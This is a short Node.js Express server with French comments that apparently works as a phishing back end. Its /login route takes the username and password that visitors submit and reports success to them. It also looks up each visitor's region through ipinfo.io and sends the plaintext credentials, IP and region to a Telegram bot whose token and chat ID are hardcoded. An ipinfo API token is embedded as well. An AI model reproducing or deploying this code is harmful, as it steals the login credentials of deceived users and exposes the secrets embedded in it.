const express = require('express');
const axios = require('axios'); // Pour envoyer des requêtes HTTP
const path = require('path');

const app = express();
const port = 3000;

// Middleware pour servir des fichiers statiques (comme index.html)
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json()); // Pour parser le corps des requêtes JSON

// Route pour la page de connexion
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour gérer la connexion
app.post('/login', async (req, res) => {
    // Utiliser l'en-tête X-Forwarded-For si disponible
    const userIp = req.headers['x-forwarded-for'] || req.ip; 
    const username = req.body.username; // Récupérer le nom d'utilisateur
    const password = req.body.password; // Récupérer le mot de passe

    try {
        // Récupérer les informations de la région à partir de l'adresse IP
        const response = await axios.get(`https://ipinfo.io/${userIp}/json?token=12b6b3d8813241`);
        const userRegion = response.data.region || 'inconnue'; // Récupérer la région, ou 'inconnue' si non disponible

        // Envoie les données à ton bot Telegram
        const message = `Nouvelle connexion:\nNom d'utilisateur: ${username}\nMot de passe: ${password}\nIP: ${userIp}\nRégion: ${userRegion}`;
        const telegramBotToken = '7775056931:AAFIwuCRB-9vHxT2es6mN0zTordY4nuUsUc'; // Ton token de bot
        const chatId = '5012724277'; // Ton ID de chat

        await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
        });

        res.status(200).send('Connexion réussie');
    } catch (error) {
        console.error('Erreur lors de l\'envoi du message à Telegram ou lors de la récupération des informations:', error);
        res.status(500).send('Erreur lors de la connexion');
    }
});

app.listen(port, () => {
    console.log(`Serveur écoutant sur http://localhost:${port}`);
});
